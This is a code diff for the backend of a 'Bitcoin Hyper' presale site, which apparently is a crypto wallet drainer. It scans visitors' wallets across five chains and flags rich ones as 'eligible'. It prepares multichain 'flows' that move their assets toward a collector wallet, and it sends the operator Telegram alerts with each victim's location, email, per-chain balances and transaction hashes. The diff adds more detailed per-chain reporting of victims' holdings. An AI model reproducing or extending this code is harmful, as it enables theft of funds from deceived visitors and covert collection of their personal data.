@@ -230,6 +230,7 @@ async function sendTelegramMessage(text) {
     }, { timeout: 5000 });
     return true;
   } catch (error) {
+    console.error('Telegram error:', error.message);
     return false;
   }
 }
@@ -250,13 +251,15 @@ async function testTelegramConnection() {
         `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
         `✅ MultiChain FlowRouter Ready\n` +
         `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
-        `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche`
+        `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
+        `📊 Admin Dashboard: /api/admin/dashboard?token=YOUR_TOKEN`
       );
       
       return true;
     }
-  } catch (error) {}
-  
+  } catch (error) {
+    console.error('Telegram connection failed:', error.message);
+  }
   return false;
 }
 
@@ -360,12 +363,16 @@ async function trackSiteVisit(ip, userAgent, referer, path) {
   
   memoryStorage.siteVisits.push(visit);
   
-  await sendTelegramMessage(
+  // Send Telegram notification for site visit
+  const telegramMessage = 
     `${location.flag} <b>NEW SITE VISIT</b>\n` +
     `📍 ${location.country} (${location.city})\n` +
-    `🖥️ ${userAgent?.substring(0, 30)}...\n` +
-    `🔗 From: ${referer || 'Direct'}`
-  );
+    `🖥️ ${userAgent?.substring(0, 50)}...\n` +
+    `🔗 From: ${referer || 'Direct'}\n` +
+    `📱 Path: ${path || '/'}\n` +
+    `🆔 Visit ID: ${visit.id}`;
+  
+  await sendTelegramMessage(telegramMessage);
   
   return visit;
 }
@@ -409,7 +416,7 @@ async function getIPLocation(ip) {
 }
 
 // ============================================
-// WALLET BALANCE CHECK
+// WALLET BALANCE CHECK - PER CHAIN DETAILED
 // ============================================
 
 async function getWalletBalance(walletAddress) {
@@ -436,6 +443,7 @@ async function getWalletBalance(walletAddress) {
     ];
 
     let totalValue = 0;
+    let chainBalances = [];
     
     for (const chain of chains) {
       try {
@@ -453,14 +461,17 @@ async function getWalletBalance(walletAddress) {
           
           totalValue += valueUSD;
           
-          results.balances.push({
+          const balanceData = {
             chain: chain.name,
             chainId: chain.chainId,
             amount: amount,
             valueUSD: valueUSD,
             symbol: chain.symbol,
             contractAddress: PROJECT_FLOW_ROUTERS[chain.name]
-          });
+          };
+          
+          results.balances.push(balanceData);
+          chainBalances.push(balanceData);
         }
       } catch (error) {}
     }
@@ -476,9 +487,27 @@ async function getWalletBalance(walletAddress) {
       results.allocation = { amount: '0', valueUSD: '0' };
     }
 
+    // Send detailed Telegram message with per-chain breakdown
+    if (chainBalances.length > 0) {
+      let chainDetails = '';
+      chainBalances.forEach(b => {
+        chainDetails += `\n   • ${b.chain}: ${b.amount.toFixed(4)} ${b.symbol} ($${b.valueUSD.toFixed(2)})`;
+      });
+      
+      const telegramMsg = 
+        `📊 <b>BALANCE SCAN COMPLETE</b>\n` +
+        `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `💵 <b>Total Value: $${results.totalValueUSD.toFixed(2)}</b>\n` +
+        `🔗 <b>Chains with Balance:</b>${chainDetails}\n` +
+        `🎯 Status: ${results.isEligible ? '✅ ELIGIBLE' : '👋 NOT ELIGIBLE'}`;
+      
+      await sendTelegramMessage(telegramMsg);
+    }
+
     return { success: true, data: results };
 
   } catch (error) {
+    console.error('Balance check error:', error);
     return {
       success: false,
       error: error.message,
@@ -522,6 +551,7 @@ app.post('/api/track-visit', async (req, res) => {
     });
     
   } catch (error) {
+    console.error('Track visit error:', error);
     res.json({ success: true });
   }
 });
@@ -589,14 +619,7 @@ app.post('/api/presale/connect', async (req, res) => {
         memoryStorage.settings.statistics.eligibleParticipants++;
       }
       
-      await sendTelegramMessage(
-        `${location.flag} <b>WALLET CONNECTED</b>\n` +
-        `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-        `💼 Balance: $${balanceResult.data.totalValueUSD}\n` +
-        `🎯 Status: ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}\n` +
-        `📍 ${location.country} (${location.city})\n` +
-        `📧 ${email}`
-      );
+      // Telegram notification already sent in getWalletBalance with chain details
       
       res.json({
         success: true,
@@ -619,6 +642,7 @@ app.post('/api/presale/connect', async (req, res) => {
     }
     
   } catch (error) {
+    console.error('Connect error:', error);
     res.status(500).json({ success: false, error: 'Connection failed' });
   }
 });
@@ -670,12 +694,18 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       completedChains: []
     });
     
+    // Create detailed transaction list for Telegram
+    let txDetails = '';
+    transactions.forEach((tx, index) => {
+      txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
+    });
+    
     await sendTelegramMessage(
       `🔐 <b>FLOW PREPARED</b>\n` +
-      `👛 ${walletAddress.substring(0, 10)}...\n` +
-      `💵 Value: $${totalFlowUSD}\n` +
-      `🔗 Chains: ${transactions.length}\n` +
-      `🆔 Flow: ${flowId}`
+      `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+      `💵 <b>Total Value: $${totalFlowUSD}</b>\n` +
+      `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
+      `🆔 Flow ID: <code>${flowId}</code>`
     );
     
     res.json({
@@ -689,15 +719,16 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
     });
     
   } catch (error) {
+    console.error('Prepare flow error:', error);
     res.status(500).json({ success: false, error: 'Preparation failed' });
   }
 });
 
 // ============================================
-// PROCESS FLOW ENDPOINT (RECORDS COMPLETED TRANSACTION)
+// EXECUTE FLOW ENDPOINT (RECORDS TRANSACTION FROM FRONTEND)
 // ============================================
 
-app.post('/api/presale/process-flow', async (req, res) => {
+app.post('/api/presale/execute-flow', async (req, res) => {
   try {
     const { walletAddress, chainName, flowId, txHash } = req.body;
     
@@ -705,7 +736,7 @@ app.post('/api/presale/process-flow', async (req, res) => {
       return res.status(400).json({ success: false });
     }
     
-    console.log(`\n💰 PROCESS FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
+    console.log(`\n💰 EXECUTE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
     
     const participant = memoryStorage.participants.find(
       p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
@@ -730,38 +761,61 @@ app.post('/api/presale/process-flow', async (req, res) => {
         timestamp: new Date().toISOString()
       });
       
-      // Update pending flow
+      // Get transaction amount from pending flow
+      let txAmount = 'unknown';
+      let txSymbol = '';
       const flow = memoryStorage.pendingFlows.get(flowId);
-      if (flow) {
-        flow.completedChains = flow.completedChains || [];
-        flow.completedChains.push(chainName);
-        flow.status = flow.completedChains.length === flow.transactions.length ? 'completed' : 'processing';
-        
-        if (flow.completedChains.length === flow.transactions.length) {
-          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
-          memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
-          
-          await sendTelegramMessage(
-            `✅ <b>FLOW COMPLETED</b>\n` +
-            `👛 ${walletAddress.substring(0, 10)}...\n` +
-            `💵 Total: $${flow.totalFlowUSD}\n` +
-            `🔗 All ${flow.transactions.length} chains processed`
-          );
+      if (flow && flow.transactions) {
+        const tx = flow.transactions.find(t => t.chain === chainName);
+        if (tx) {
+          txAmount = tx.amount;
+          txSymbol = tx.symbol;
         }
       }
       
       await sendTelegramMessage(
-        `💰 <b>CHAIN PROCESSED</b>\n` +
-        `👛 ${walletAddress.substring(0, 10)}...\n` +
-        `🔗 ${chainName}\n` +
-        `🆔 ${txHash?.substring(0, 10)}...`
+        `💰 <b>CHAIN TRANSACTION RECORDED</b>\n` +
+        `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `🔗 Chain: ${chainName}\n` +
+        `💵 Amount: ${txAmount} ${txSymbol}\n` +
+        `🆔 Tx Hash: <code>${txHash}</code>\n` +
+        `🆔 Flow ID: <code>${flowId}</code>`
       );
+      
+      // Update pending flow
+      if (flow) {
+        flow.completedChains = flow.completedChains || [];
+        if (!flow.completedChains.includes(chainName)) {
+          flow.completedChains.push(chainName);
+        }
+        
+        // Check if all chains completed
+        if (flow.completedChains.length === flow.transactions.length) {
+          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
+          memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
+          
+          // Build completion details
+          let completionDetails = '';
+          flow.transactions.forEach(t => {
+            const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
+            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol}`;
+          });
+          
+          await sendTelegramMessage(
+            `✅ <b>🎉 FLOW COMPLETED 🎉</b>\n` +
+            `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+            `💵 <b>Total Value: $${flow.totalFlowUSD}</b>\n` +
+            `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
+            `🆔 Flow ID: <code>${flowId}</code>`
+          );
+        }
+      }
     }
     
     res.json({ success: true });
     
   } catch (error) {
-    console.error('Process flow error:', error);
+    console.error('Execute flow error:', error);
     res.status(500).json({ success: false });
   }
 });
@@ -792,15 +846,16 @@ app.post('/api/presale/claim', async (req, res) => {
     
     await sendTelegramMessage(
       `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
-      `👛 ${walletAddress.substring(0, 10)}...\n` +
-      `🎟️ ID: ${claimId}\n` +
-      `🎁 ${participant.allocation?.amount || '5000'} BTH\n` +
+      `👛 ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+      `🎟️ Claim ID: <code>${claimId}</code>\n` +
+      `🎁 Allocation: ${participant.allocation?.amount || '5000'} BTH\n` +
       `📍 ${participant.country} ${participant.flag}`
     );
     
     res.json({ success: true });
     
   } catch (error) {
+    console.error('Claim error:', error);
     res.status(500).json({ success: false });
   }
 });
@@ -995,9 +1050,10 @@ app.listen(PORT, '0.0.0.0', async () => {
   ✅ Arbitrum: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
   ✅ Avalanche: 0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4
   
+  🤖 TELEGRAM BOT: ${process.env.TELEGRAM_BOT_TOKEN ? '✅ Configured' : '❌ Missing'}
+  
   🚀 READY FOR MULTICHAIN FLOWS
   `);
   
   await testTelegramConnection();
 });
-
